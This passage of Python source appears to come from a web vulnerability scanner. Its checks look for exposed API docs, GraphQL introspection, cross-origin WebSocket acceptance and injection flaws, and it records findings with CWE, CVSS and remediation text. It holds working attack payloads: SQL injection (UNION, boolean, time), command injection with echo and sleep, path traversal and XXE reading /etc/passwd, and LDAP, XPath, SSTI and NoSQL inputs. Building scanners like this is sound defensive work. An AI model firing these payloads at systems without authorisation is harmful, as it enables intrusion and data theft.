        expect = _b64.b64encode(_hl.sha1((key + GUID).encode()).digest()).decode()
        if r.status != 101 or r.hdr("sec-websocket-accept") != expect:
            continue
        add(F("LOW", f"Active WebSocket endpoint: {label}",
              'The WebSocket handshake succeeded (101 Switching Protocols with a valid Sec-WebSocket-Accept) without initial authentication. If this channel carries session data, per-message authentication and authorization are required.',
              evidence="handshake 101 + accept valid", cwe="CWE-1385",
              owasp="A05:2021", cvss=3.7,
              remed='Require authentication at the handshake and authorization per message.',
              confidence="confirmed", location=full))
        try:
            r2 = ctx.client.request("GET", full, headers={
                **hdrs, "Origin": "https://evil.invalid"})
        except Exception:
            r2 = None
        if r2 is not None and r2.status == 101:
            add(F("MEDIUM", f"WebSocket accepts cross-origin connections (CSWSH indication): {label}",
                  "A handshake with a foreign Origin was still accepted (101) — the server does not validate Origin, so a malicious site could hijack an authenticated user's WebSocket connection (CSWSH).",
                  evidence="Origin https://evil.invalid -> 101", cwe="CWE-1385",
                  owasp="A05:2021", cvss=6.5,
                  remed='Validate the Origin header against an allowlist during the handshake.',
                  confidence="probable", location=full))


def c_api_exposure(ctx, add):
    ctx.soft404()
    docs = {
        "/swagger-ui.html": "Swagger UI", "/swagger-ui/": "Swagger UI",
        "/swagger": "Swagger UI", "/openapi.json": "OpenAPI spec",
        "/swagger.json": "Swagger spec", "/v3/api-docs": "OpenAPI v3 docs",
        "/v2/api-docs": "Swagger v2 docs", "/api-docs": "API docs",
        "/redoc": "ReDoc", "/docs": "API docs",
    }
    for path, label in docs.items():
        r = ctx.client.get(path)
        if r.status != 200 or ctx.is_missing(r) or not r.body:
            continue
        sig = re.search(r'"(openapi|swagger)"\s*:|swagger-ui|redoc|openapi', r.body, re.I)
        if sig:
            add(F("MEDIUM", f"API documentation exposed: {label} ({path})",
                  'A public API spec/UI maps all endpoints for an attacker. If the API is intentionally public this may be acceptable — assess the risk.',
                  evidence=f"HTTP 200, signature: {sig.group(0)[:40]}", cwe="CWE-200",
                  owasp="A05:2021", cvss=5.3,
                  remed='Restrict API docs to the internal network / require authentication.',
                  confidence="confirmed", location=path))
            break
    # GraphQL introspection — verifikasi nyata dengan query introspeksi
    for gpath in ["/graphql", "/api/graphql", "/graphiql"]:
        r = ctx.client.get(gpath)
        if r.status == 404 or ctx.is_missing(r):
            continue
        q = '{"query":"{__schema{queryType{name}}}"}'
        resp = ctx.client.post(gpath, data=q,
                               headers={"Content-Type": "application/json"})
        if resp.status == 200 and "__schema" in (resp.body or ""):
            add(F("HIGH", f"GraphQL introspection enabled: {gpath}",
                  'The entire GraphQL schema is publicly readable — an attacker can map all available queries/mutations.',
                  evidence='__schema reflected from an introspection query', cwe="CWE-200",
                  owasp="A05:2021", cvss=7.5,
                  remed='Disable introspection in production; limit query depth/complexity.',
                  confidence="confirmed", location=gpath))
            return
        if r.status == 200 and "graphql" in (r.body or "").lower():
            add(F("LOW", f"Endpoint GraphQL reachable: {gpath}",
                  'The GraphQL endpoint responds publicly (introspection not confirmed).',
                  evidence=f"GET {gpath} -> 200", cwe="CWE-200", owasp="A05:2021",
                  cvss=3.1, remed='Ensure authentication and rate limiting on the GraphQL endpoint.',
                  confidence="probable", location=gpath))
            return


# ------------------------------------------------------------ active: injection suite

def _sql_error_in(body, baseline_body=""):
    low = (body or "").lower()
    blow = (baseline_body or "").lower()
    return [e for e in SQL_ERRORS if e in low and e not in blow]


# XPath/XQuery error signatures (Priority 1). The bare word "xpath" is
# deliberately NOT a signature: it appears in legitimate documentation
# text everywhere (the "f5" WAF false-positive lesson). Only exception
# class names, standard XQuery error codes, and error phrases qualify.
XPATH_ERRORS = [
    "javax.xml.xpath", "xpathsyntaxerror", "xpath exception",
    "system.xml.xpath", "xpathnavigator", "xpathexpression",
    "xmlxpathcomp", "xpath_eval", "xpathevalerror",
    "xpty0004", "xpst0003", "xpst0017",
    "saxon-api", "net.sf.saxon", "lxml.etree.xpath",
    "invalid expression", "unterminated quote in expression",
]


def _xpath_error_in(body, baseline_body=""):
    low = (body or "").lower()
    blow = (baseline_body or "").lower()
    return [e for e in XPATH_ERRORS if e in low and e not in blow]


LDAP_ERRORS = ["ldap_search", "ldap_bind", "invalid dn syntax",
               "javax.naming", "ldap: error code", "ldapexception",
               "ldap exception", "bad search filter", "invalid filter",
               "no such object", "operations error"]

_LDAP_HINT = re.compile(
    r"ldap|directory|uid|user|login|account|search|dir|cn", re.I)


def _ldap_differential(ctx, R, baseline_body, unrefl):
    """WS1 (v1.8.0): boolean differential for LDAP filter contexts,
    judged by the v1.7.0 diffconfirm oracle. The template is the
    WILDCARD page (the full result set); the FALSE-prime is an
    impossible value (the empty result). Verdicts:

      "full"    — a fresh wildcard shot reads True while a second
                  impossible value, a junk control and the plain
                  baseline value all read False: the value is
                  interpreted as filter syntax, not as a literal.
      "partial" — the wildcard/impossible contrast holds but one
                  control is ambiguous.
      "indeterminate" / "none" — no claim is made.

    The Arithmetic Proof Battery deliberately does NOT apply here:
    LDAP filters have no arithmetic conditions to prove. This is a
    documented exception, the same treatment the XPath boolean path
    received in v1.7.0 — the verdict rests on the differential plus,
    for the confirmed tier, independent directory-error evidence."""
    imp_a = f"ptknomatch{ctx.marker}a"
    imp_b = f"ptknomatch{ctx.marker}b"
    junk = f"ptkjunk{ctx.marker}ldap"
    w1 = R("*")
    w2 = R("*")
    if not w1.status or not w2.status or not w1.body:
        return "indeterminate", "wildcard probe did not answer"
    if any(s in w1.body.lower() for s in LDAP_ERRORS):
        return "indeterminate", \
            "the wildcard value itself triggers an LDAP error page"
    e1 = R(imp_a)
    if not e1.status:
        return "indeterminate", "impossible-value probe did not answer"
    oracle = diffconfirm.DifferentialOracle(
        unrefl(w1.body, "*"), unrefl(w2.body or "", "*"),
        unrefl(e1.body or "", imp_a), error_signatures=LDAP_ERRORS)

    def read(v):
        r = R(v)
        if r is None or not r.status:
            return None
        return oracle.read(unrefl(r.body or "", v), r.status)

    w_read = read("*")
    i_read = read(imp_b)
    j_read = read(junk)
    b_read = oracle.read(baseline_body)
    detail = (f"wildcard read={w_read}, impossible read={i_read}, "
              f"junk read={j_read}, baseline read={b_read}, "
              f"matchRatio learned {oracle.match_ratio:.3f}")
    if w_read is True and i_read is False and j_read is False \
            and b_read is False:
        return "full", detail
    if w_read is True and i_read is False and \
            (j_read is False or b_read is False):
        return "partial", detail
    if w_read is None or i_read is None:
        return "indeterminate", detail
    return "none", detail


def c_web_injection(ctx, add):
    """Suite injeksi terverifikasi: SQLi (error/boolean/time), XSS, SSTI, LFI, CMDi.
    Setiap teknik berhenti per-parameter begitu terkonfirmasi, tetapi parameter &
    teknik lain TETAP diuji (perbaikan dari v2 yang return di temuan pertama)."""
    def _xpath_probe(base, pname, R, bbody, loc, stable, sqli_struct,
                     _is_json):
        """XPath section (Priority 1) for one parameter: error-based
        = probable; boolean-based = confirmed only when BOTH
        independent pairs pass. No blind extraction, no OOB."""
        # ---------- XPath injection (Priority 1: error-based = probable,
        # boolean-based = confirmed only when BOTH independent pairs pass.
        # No blind extraction, no OOB. Skipped when SQL is already proven
        # STRUCTURALLY on this parameter (error/UNION/boolean) — one query
        # language proven is enough, and a second differential claim on
        # the same behavior would be cross-technique noise. A time-based
        # SQLi hit alone does NOT close this gate: a generic sleep proves
        # delay, not the query language. JSON contexts are skipped
        # entirely: escaped reflection there defeats differential tests.)
        if not sqli_struct and not _is_json:
            xpath_hit = False
            for payload in ["'", "x' or 1=1 or 'x'='y"]:
                if ctx.cancelled():
                    return
                r = R(payload)
                errs = _xpath_error_in(_unrefl(r.body, payload), bbody)
                if errs:
                    add(F("HIGH", f"XPath Injection (error indication): {base} param '{pname}'",
                          'The XPath payload triggered an XPath/XQuery error message from the backend that does not appear in the baseline.',
                          evidence=f"payload={payload!r} -> error: {errs[0]}",
                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.1,
                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
                          confidence="probable", location=loc, param=pname))
                    xpath_hit = True
                    break
            if not xpath_hit and stable:
                _xpath_pairs = [("x' or '1'='1", "x' or '1'='2"),
                                ("' or count(/*)>0 or '", "' or count(/*)=0 or '")]
                _xpath_passed = 0
                for _tp, _fp in _xpath_pairs:
                    if ctx.cancelled():
                        return
                    _rt, _rf = R(_tp), R(_fp)
                    if _xpath_error_in(_rt.body, bbody) or _xpath_error_in(_rf.body, bbody):
                        continue
                    _tb = _unrefl(_rt.body, _tp)
                    _fb = _unrefl(_rf.body, _fp)
                    _sim_tf = similarity(_tb, _fb)
                    if _sim_tf < 0.75 and len(_tb) > len(_fb) * 1.2:
                        _rt2 = R(_tp)
                        if similarity(_unrefl(_rt2.body, _tp), _tb) > 0.90:
                            _xpath_passed += 1
                            ctx.L(f"  [injection] {base}?{pname}: XPath boolean T/F sim={_sim_tf:.2f} len {len(_tb)}/{len(_fb)}")
                if _xpath_passed == 2:
                    add(F("HIGH", f"XPath Injection (boolean-based): {base} param '{pname}'",
                          'Both independent XPath boolean pairs behaved as a manipulated query: the TRUE condition reproducibly returned substantially more content than the FALSE condition, with no error signature involved.',
                          evidence="2/2 boolean pairs passed (sim(T,F)<0.75, len(T)>1.2x len(F), T reproducible)",
                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.6,
                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
                          confidence="confirmed", location=loc, param=pname))
                elif _xpath_passed == 1:
                    add(F("HIGH", f"XPath Injection (boolean indication): {base} param '{pname}'",
                          'One XPath boolean pair behaved as a manipulated query (TRUE reproducibly returned substantially more than FALSE) but the second independent pair did not — manual validation is required.',
                          evidence="1/2 boolean pairs passed (sim(T,F)<0.75, len(T)>1.2x len(F), T reproducible)",
                          cwe="CWE-643", owasp="A03:2021 Injection", cvss=8.1,
                          remed='Do not build XPath expressions by string concatenation; use precompiled XPath expressions with typed variables (e.g. XPathVariableResolver or equivalent in your stack) and validate input against an allowlist.',
                          confidence="probable", location=loc, param=pname))

    # v1.8.0: limit 30 -> 40. The surface grew (the new checks add
    # first-class crawl surface of their own — LDAP directory pages,
    # OAuth authorize URLs) and at 30 the round-robin silently cut
    # tail parameters (the battery's planted LFI target fell off),
    # losing whole detection classes without a trace.
    targets = ctx.param_targets(limit=40)
    mk = ctx.marker
    ctx.L(f"  [injection] {len(targets)} target parameters from crawl")
    # Konteks respons: refleksi verbatim payload (mis. echo JSON) menipu
    # uji diferensial — bandingkan SETELAH payload dibuang dari body.
    def _unrefl(body, value):
        if not body or not value:
            return body or ""
        out = body.replace(value, "\x00")
        try:
            from urllib.parse import quote as _q
            out = out.replace(_q(value), "\x00")
        except Exception:
            pass
        return out
    time_tested = 0
    for base, pname, method, orig in targets:
        if ctx.cancelled():
            return
        loc = base
        def R(value):
            return ctx.req_param(base, pname, value, method, orig)
        baseline = R("1")
        bbody = baseline.body or ""
        _ctype = (baseline.hdr("content-type") or "").lower()
        _is_json = "json" in _ctype
        # Stabilitas baseline: halaman yang berubah-ubah antar request (iklan,
        # timestamp, rotasi konten) membuat uji boolean/time rawan FP — ukur dulu.
        baseline2 = R("1")
        stable = similarity(bbody, baseline2.body or "") > 0.80
        if not stable:
            ctx.L(f"  [injection] baseline {base}?{pname} NOT stable — boolean/time tests skipped for this parameter")
        # Gate catch-all/SPA: bila respons parameter ini identik dengan shell
        # soft-404 (semua path = halaman yang sama) dan nilai acak tidak
        # berpengaruh sama sekali, parameter ini tidak nyata — lewati seluruh
        # uji untuk menghindari FP massal ala v3.2.0.
        junk = f"ptkjunk{ctx.marker}"
        rj = R(junk)
        soft = ctx.soft404()
        if soft is not None and similarity(bbody, soft.body or "") > 0.98 \
                and junk not in (rj.body or "") \
                and similarity(rj.body or "", bbody) > 0.995:
            ctx.L(f"  [injection] {base}?{pname} = shell catch-all (SPA gate) — skipped")
            continue
        # ---------- SQLi error-based (multi-payload, bandingkan baseline)
        sqli_found = False
        sqli_struct = False  # bukti struktural SQL (error/UNION/boolean) — gerbang XPath
        for payload in ["1'", '1"', "1')", "1' OR '1'='1"]:
            r = R(payload)
            errs = _sql_error_in(r.body, bbody)
            if errs:
                add(F("CRITICAL", f"SQL Injection (error-based): {base} param '{pname}'",
                      'The injection payload triggered a database error message that does not appear in the baseline.',
                      evidence=f"payload={payload!r} -> error: {errs[0]}",
                      cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                      remed='Use parameterized queries/prepared statements.',
                      confidence="confirmed", location=loc, param=pname))
                sqli_found = True
                sqli_struct = True
                break
        # ---------- SQLi UNION-based (hitung kolom: N cocok + N besar gagal)
        if not sqli_found and stable:
            ok_cols = []
            for n in range(1, 7):
                cols = ",".join(["NULL"] * n)
                _pay = f"1' UNION SELECT {cols}-- -"
                r = R(_pay)
                if r.status == 200 and not _sql_error_in(r.body, bbody) \
                        and similarity(_unrefl(r.body, _pay), bbody) > 0.45:
                    ok_cols.append(n)
            if ok_cols:
                cols10 = ",".join(["NULL"] * 10)
                _pay10 = f"1' UNION SELECT {cols10}-- -"
                rb = R(_pay10)
                broken = rb.status != 200 or bool(_sql_error_in(rb.body, bbody)) \
                    or similarity(_unrefl(rb.body, _pay10), bbody) < 0.45
                if broken:
                    add(F("CRITICAL", f"SQL Injection (UNION-based, {ok_cols[0]} columns): {base} param '{pname}'",
                          f"UNION SELECT with {ok_cols[0]} columns accepted (similar to baseline) while 10 columns were rejected — the query structure can be manipulated to extract data from other tables.",
                          evidence=f"matching columns: {ok_cols}, 10 columns: rejected",
                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                          remed='Use parameterized queries/prepared statements.',
                          confidence="confirmed", location=loc, param=pname))
                    sqli_found = True
                    sqli_struct = True
        # ---------- SQLi heuristic pre-screen (WS2 v1.7.0): a random
        # string carrying one ' and one " triages the parameter — a
        # framework casting error means the value is converted to a
        # number before reaching any query (not string-injectable:
        # differential/time paths skipped); a fresh DBMS error means
        # the probe reached a database.
        heur_val = diffconfirm.heuristic_payload()
        heur_resp = None
        _cast = False
        if not sqli_found and not _is_json:
            heur_resp = R(heur_val)
            _tri = diffconfirm.heuristic_triage(
                heur_resp.status, _unrefl(heur_resp.body, heur_val),
                bbody, SQL_ERRORS)
            if _tri == "casting":
                _cast = True
                ctx.L(f"  [injection] {base}?{pname}: heuristic probe hit a type-casting error — SQL differential/time paths skipped for this parameter")
            elif _tri == "dbms_error":
                ctx.L(f"  [injection] {base}?{pname}: heuristic probe triggered a database error (no baseline error)")
        # ---------- SQLi boolean-based (WS2 v1.7.0: differential
        # confirmation with dynamic markings + learned matchRatio +
        # 4-step verdict + WAF guard, then the Arithmetic Proof Battery
        # — mandatory for the confirmed tier per decision K2; without a
        # passed battery the finding is capped at probable.)
        if not sqli_found and stable and not _cast and not _is_json:
            from types import SimpleNamespace as _NS

            def _bprobe(v, _hr=heur_resp, _hv=heur_val):
                if v == _hv and _hr is not None:
                    return _NS(status=_hr.status,
                               body=_unrefl(_hr.body or "", v))
                r = R(v)
                return _NS(status=r.status, body=_unrefl(r.body or "", v))

            _prover = diffconfirm.BooleanProver(
                _bprobe, bbody, baseline2.body or "", "1 AND 1=1",
                "1 AND 1=2", heur_val, error_signatures=SQL_ERRORS)
            _verd = _prover.run_verdict()
            if _verd == "fp_waf":
                ctx.L(f"  [injection] {base}?{pname}: boolean difference rejected as WAF artifact (FALSE POSITIVE guard)")
            elif _verd == "differential_ok":
                def _cond(kind, r1, r2, r3):
                    return {"eq_true": f"1 AND {r1}={r1}",
                            "eq_false_a": f"1 AND {r1}={r3}",
                            "eq_false_b": f"1 AND {r3}={r2}",
                            "invalid": f"1 AND {r3} {r2}",
                            "eq_true_b": f"1 AND {r2}={r2}"}[kind]

                _bok, _brep = _prover.run_battery(_cond, rounds=1)
                if _bok:
                    add(F("CRITICAL", f"SQL Injection (boolean-based): {base} param '{pname}'",
                          'The parameter answers arithmetic conditions truthfully: a differential verdict (dynamic-content markings, learned match ratio, TRUE/FALSE re-shots, WAF guard) was followed by the Arithmetic Proof Battery — five assertions with fresh random integers all read correctly, which page-shape or reflection artifacts cannot fake.',
                          evidence=("differential proven; arithmetic proof "
                                    "battery passed 5/5 assertions (fresh "
                                    "random integers r1<r2<r3); "
                                    + "; ".join(_prover.detail)),
                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                          remed='Use parameterized queries/prepared statements.',
                          confidence="confirmed", location=loc, param=pname))
                    sqli_found = True
                    sqli_struct = True
                else:
                    add(F("CRITICAL", f"SQL Injection (boolean-based indication): {base} param '{pname}'",
                          'TRUE/FALSE conditions produce a proven page differential, but the Arithmetic Proof Battery did not pass, so per the accuracy policy this point is capped at probable — fresh random arithmetic was not answered truthfully, which a genuine boolean injection must do.',
                          evidence=("differential proven; arithmetic proof "
                                    "battery FAILED: "
                                    + "; ".join(_brep[-2:])),
                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                          remed='Use parameterized queries/prepared statements.',
                          confidence="probable", location=loc, param=pname))
                    ctx.L(f"  [injection] {base}?{pname}: boolean differential held but arithmetic battery failed — capped at probable")
            elif _verd == "indeterminate":
                ctx.L(f"  [injection] {base}?{pname}: boolean differential indeterminate (error pages / request failures)")
        # ---------- SQLi time-based (WS1 v1.7.0: statistical timing
        # oracle — null model from >=30 FALSE-condition samples, MAD
        # outlier trim, verdict at mean + 7 sigma with a 0.5 s floor,
        # triple sleep / zero-delay / sleep confirmation. A model with
        # stdev > 0.5 s is too noisy: INCONCLUSIVE, never a guess.)
        if not sqli_found and stable and not _cast and time_tested < 3:
            time_tested += 1
            _model = timingoracle.TimingModel()

            def _fsample():
                _r = R("1 AND 1=2")
                return _r.elapsed if _r.status else None

            _model.collect(_fsample, cancelled=ctx.cancelled)
            if not _model.ready or _model.noisy:
                ctx.L(f"  [injection] {base}?{pname}: timing oracle INCONCLUSIVE ({_model.describe()})")
            else:
                for payload in SQL_TIME_PAYLOADS:
                    if ctx.cancelled():
                        break
                    _twin = _zero_delay(payload)
                    if _twin == payload:
                        continue

                    def _fire(want, _p=payload, _t=_twin):
                        _r = R(_p if want else _t)
                        return _r.elapsed if _r.status else None

                    if _model.confirm(_fire, cancelled=ctx.cancelled) \
                            == timingoracle.DELAYED:
                        add(F("CRITICAL", f"SQL Injection (time-based): {base} param '{pname}'",
                              'The delay payload was confirmed by the statistical timing oracle: the null model was built from false-condition samples and the delay fired in the triple sleep / zero-delay / sleep sequence.',
                              evidence=f"payload={payload!r}; {_model.describe()}",
                              cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                              remed='Use parameterized queries/prepared statements.',
                              confidence="confirmed", location=loc, param=pname))
                        sqli_found = True
                        break
        # ---------- XSS reflected (WS2 v1.4.0: marker sandwich +
        # parsed-DOM position evidence — reflection alone is NOT a
        # finding; dalfox discipline per the source audit. The marker
        # probe goes first: whether the sandwich reflects, and which
        # special characters survive, chooses the payload family.)
        if _is_json:
            ctx.L(f"  [injection] {base}?{pname}: JSON response — reflection inside an escaped JSON string is not an HTML context, XSS test skipped")
        else:
            marks = ctx.xss_marks()
            rp = R(xssverify.sandwich_probe(marks))
            pbody = rp.body or ""
            if marks["inner"] in pbody or marks["open"] in pbody:
                survived = xssverify.surviving_chars(pbody, marks)
                fams = xssverify.payload_families(survived)
                ctx.L(f"  [xss] {base}?{pname}: sandwich reflected; "
                      f"surviving={''.join(sorted(survived)) or '-'} "
                      f"families={fams}")
                xss_confirmed = False
                near_note = ""
                for fam, payload in xssverify.build_payloads(marks, fams):
                    r = R(payload)
                    res = xssverify.analyze(
                        r.status, r.hdr("content-type") or "",
                        r.body or "", bbody, marks)
                    if res["verdict"] == "confirmed":
                        add(F("HIGH", f"Reflected XSS verified: {base} param '{pname}'",
                              'The per-scan marker sandwich reached an executable position in the parsed DOM ('
                              + ", ".join(res["kinds"]) + '). Reflection alone is never credited: the payload marker had to survive HTML parsing inside a sink-bearing position (event handler, javascript:/data: URL, script element/context, or marker element with a surviving sink).',
                              evidence=f"payload={payload[:80]!r} -> {res['detail']}",
                              cwe="CWE-79", owasp="A03:2021 Injection",
                              cvss=8.1, remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
                              confidence="confirmed", location=loc, param=pname))
                        xss_confirmed = True
                        break
                    if res["verdict"] == "reflected" and res["near_miss"] \
                            and not near_note:
                        near_note = res["detail"]
                if not xss_confirmed and near_note:
                    add(F("MEDIUM", f"Reflected XSS (position not confirmed): {base} param '{pname}'",
                          'The marker sandwich was reflected into a markup/JS context, but no payload reached a proven executable position in the parsed DOM — reported as probable (position not confirmed), never as verified XSS. Manual validation (or the headless execution check) is required to promote this.',
                          evidence=near_note, cwe="CWE-79",
                          owasp="A03:2021 Injection", cvss=5.4,
                          remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
                          confidence="probable", location=loc, param=pname))
            else:
                ctx.L(f"  [xss] {base}?{pname}: marker not reflected — XSS payloads not fired")
        # ---------- SSTI (hasil komputasi harus muncul, literal payload tidak)
        a, b = ctx.num_a, ctx.num_b
        expect = str(a * b)
        for tpl in [f"{{{{{a}*{b}}}}}", f"${{{a}*{b}}}", f"#{{{a}*{b}}}"]:
            r = R(tpl)
            if expect in (r.body or "") and tpl not in r.body and expect not in bbody:
                add(F("CRITICAL", f"Server-Side Template Injection: {base} param '{pname}'",
                      f"Ekspresi template {tpl} evaluated by the server to {expect}.",
                      evidence=f"{tpl} -> {expect} in the response", cwe="CWE-94",
                      owasp="A03:2021 Injection", cvss=9.8,
                      remed='Do not render user input as a template; use a sandboxed/logic-less engine.',
                      confidence="confirmed", location=loc, param=pname))
                break
        # ---------- Path traversal / LFI (signature file sistem)
        for payload in ["../../../../etc/passwd", "....//....//....//etc/passwd",
                        "..%2f..%2f..%2fetc%2fpasswd",
                        "..\\..\\..\\..\\windows\\win.ini"]:
            r = R(payload)
            body = r.body or ""
            if re.search(r"root:.*?:0:0:", body) or "[extensions]" in body and "win.ini" in payload:
                kind = "LFI/Path Traversal"
                add(F("CRITICAL", f"{kind} verified: {base} param '{pname}'",
                      'System file contents outside the webroot were successfully read via the parameter.',
                      evidence=f"payload={payload!r} -> system file signature found",
                      cwe="CWE-22", owasp="A01:2021 Broken Access Control", cvss=8.6,
                      remed='Whitelist file names; do not concatenate input into paths; chroot/jail the file directory.',
                      confidence="confirmed", location=loc, param=pname))
                break
        # ---------- Command injection
        # Bukti terkuat DULU: output komputasi $((a*b)) — hasil kali TIDAK ada di
        # dalam request, jadi refleksi (termasuk echo URL-encoded) tidak bisa
        # memalsukannya. Echo marker hanya cadangan dengan anti-refleksi
        # ternormalisasi (unquote + unescape) — v3.2.0 terkecoh echo URI encoded.
        from urllib.parse import unquote as _uq
        import html as _html

        def _reflected(payload, body):
            b = body or ""
            return payload in b or payload in _uq(b) or payload in _html.unescape(b)

        cmk = f"PTK{mk}"
        cmd_found = False
        ca, cb = ctx.num_a, ctx.num_b
        prod = str(ca * cb)
        for payload in [f"1;echo $(({ca}*{cb}))", f"1|echo $(({ca}*{cb}))",
                        f"1&&echo $(({ca}*{cb}))"]:
            r = R(payload)
            if prod in (r.body or "") and f"$(({ca}*{cb}))" not in (r.body or "") \
                    and prod not in bbody and not _reflected(payload, r.body):
                add(F("CRITICAL", f"Command Injection verified: {base} param '{pname}'",
                      f"Ekspresi shell $(({ca}*{cb})) evaluated by the server to {prod} — this computed result is not in the request, so it is not a reflection.",
                      evidence=f"payload={payload!r} -> output {prod}", cwe="CWE-78",
                      owasp="A03:2021 Injection", cvss=9.8,
                      remed="Hindari shell; pakai API library & whitelist argumen.",
                      confidence="confirmed", location=loc, param=pname))
                cmd_found = True
                break
        if not cmd_found:
            for payload in [f"1;echo {cmk}", f"1|echo {cmk}", f"1$(echo {cmk})",
                            f"1`echo {cmk}`"]:
                r = R(payload)
                # marker harus muncul TANPA payload terpantul dalam bentuk apapun
                # (mentah, URL-decoded, maupun HTML-unescaped).
                if cmk in (r.body or "") and not _reflected(payload, r.body) \
                        and cmk not in bbody:
                    add(F("CRITICAL", f"Command Injection verified: {base} param '{pname}'",
                          'Command marker reflected in the response — input is executed by the shell.',
                          evidence=f"payload={payload!r} -> marker reflected", cwe="CWE-78",
                          owasp="A03:2021 Injection", cvss=9.8,
                          remed="Hindari shell; pakai API library & whitelist argumen.",
                          confidence="confirmed", location=loc, param=pname))
                    cmd_found = True
                    break
        if not cmd_found and stable and time_tested < 3:
            # WS1 v1.7.0: the single-shot sleep guess is replaced by the
            # statistical timing oracle (model from plain-value samples,
            # triple sleep / sleep-0 / sleep confirmation). Shares the
            # per-scan time-test budget (time_tested) with the SQLi path
            # because a model costs >=30 requests to build.
            time_tested += 1
            _cmodel = timingoracle.TimingModel()

            def _csample():
                _r = R("1")
                return _r.elapsed if _r.status else None

            _cmodel.collect(_csample, cancelled=ctx.cancelled)
            if not _cmodel.ready or _cmodel.noisy:
                ctx.L(f"  [injection] {base}?{pname}: CMDi timing oracle INCONCLUSIVE ({_cmodel.describe()})")
            else:
                def _cfire(want):
                    _r = R("1; sleep 3" if want else "1; sleep 0")
                    return _r.elapsed if _r.status else None

                if _cmodel.confirm(_cfire, cancelled=ctx.cancelled) \
                        == timingoracle.DELAYED:
                    add(F("CRITICAL", f"Command Injection (time-based): {base} param '{pname}'",
                          'The sleep command delay was confirmed by the statistical timing oracle (null model from baseline samples; triple sleep / sleep-0 / sleep sequence fired).',
                          evidence=f"payload='1; sleep 3'; {_cmodel.describe()}",
                          cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
                          remed="Hindari shell; pakai API library & whitelist argumen.",
                          confidence="confirmed", location=loc, param=pname))
        # ---------- XXE (POST XML ke endpoint parameter; entitas harus TER-EXPAND)
        xxe_body = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY ptk SYSTEM '
                    f'"file:///etc/passwd">]><r>&ptk;</r>')
        xr = ctx.client.post(base, data=xxe_body,
                             headers={"Content-Type": "application/xml"})
        if re.search(r"root:.*?:0:0:", xr.body or ""):
            add(F("CRITICAL", f"XML External Entity (XXE) verified: {base} param '{pname}'",
                  'The XML parser processes the external entity and returns the contents of /etc/passwd.',
                  evidence='signature /etc/passwd from entity &ptk;', cwe="CWE-611",
                  owasp="A05:2021 Security Misconfiguration", cvss=9.1,
                  remed='Disable DTD/external entities in the XML parser (defusedxml / feature off).',
                  confidence="confirmed", location=loc, param=pname))
        # ---------- LDAP injection (signature error LDAP di respons, bukan di baseline)
        _ldap_err = False
        for payload in ["*)(|(objectClass=*)", "*)(&(|", "admin)(|(password=*"]:
            r = R(payload)
            low = (r.body or "").lower()
            if any(s in low for s in ("ldap_search", "ldap_bind", "invalid dn syntax",
                                      "javax.naming", "ldap: error code", "objectclass")) \
                    and "objectclass" not in bbody.lower():
                # 'objectclass' saja terlalu umum bila payload terpantul; wajib ada konteks error/naming
                if any(s in low for s in ("ldap_search", "ldap_bind", "invalid dn syntax",
                                          "javax.naming", "ldap: error code")):
                    add(F("HIGH", f"LDAP Injection (LDAP error indication): {base} param '{pname}'",
                          'The LDAP filter payload triggered an LDAP error/naming message from the backend.',
                          evidence=f"payload={payload!r}", cwe="CWE-90",
                          owasp="A03:2021 Injection", cvss=8.1,
                          remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
                          confidence="probable", location=loc, param=pname))
                    _ldap_err = True
                    break
        # ---------- LDAP boolean differential (WS1 v1.8.0): the
        # wildcard-vs-impossible pair judged by the diffconfirm oracle.
        # Runs only with directory context: an LDAP error was observed
        # for this parameter, or the endpoint/parameter is shaped like
        # a directory/search field. The confirmed tier additionally
        # requires the independent error evidence — a bare wildcard
        # contrast on a generic search box stays probable.
        if stable and not _is_json and not sqli_struct and \
                (_ldap_err or _LDAP_HINT.search(base)
                 or _LDAP_HINT.search(pname)):
            _lv, _ld = _ldap_differential(ctx, R, bbody, _unrefl)
            if _lv == "full" and _ldap_err:
                add(F("HIGH", f"LDAP Injection (boolean-based): {base} param '{pname}'",
                      'The parameter value is interpreted as LDAP filter syntax: a wildcard value reproducibly returns the full result set while impossible values, a junk control and the plain baseline value return the empty result, and malformed filter payloads make the backend answer with directory errors. Input reaches the LDAP filter without escaping. (The Arithmetic Proof Battery does not apply to LDAP filters — filter syntax has no arithmetic conditions; this verdict rests on the differential plus independent directory-error evidence, a documented exception like the XPath boolean path.)',
                      evidence=_ld, cwe="CWE-90",
                      owasp="A03:2021 Injection", cvss=8.6,
                      remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
                      confidence="confirmed", location=loc, param=pname))
            elif _lv in ("full", "partial"):
                add(F("HIGH", f"LDAP Injection (boolean indication): {base} param '{pname}'",
                      'A wildcard value changes this parameter\'s result set the way an LDAP presence filter would (full set) while impossible values return the empty result — filter-semantics behaviour. Reported as probable: either the differential controls were not all clean or no independent directory-error evidence was observed for this parameter.',
                      evidence=_ld, cwe="CWE-90",
                      owasp="A03:2021 Injection", cvss=8.1,
                      remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
                      confidence="probable", location=loc, param=pname))
            else:
                ctx.L(f"  [ldap] {base}?{pname}: differential {_lv} ({_ld})")
        _xpath_probe(base, pname, R, bbody, loc, stable, sqli_struct,
                     _is_json)
        if ctx.cancelled():
            return
        # ---------- NoSQL injection (operator Mongo sebagai nilai: respons berubah drastis)
        for payload in ['{"$gt": ""}', '{"$ne": null}']:
            r = R(payload)
            if r.status == 200 and baseline.status == 200 and r.body and bbody:
                sim = similarity(r.body, bbody)
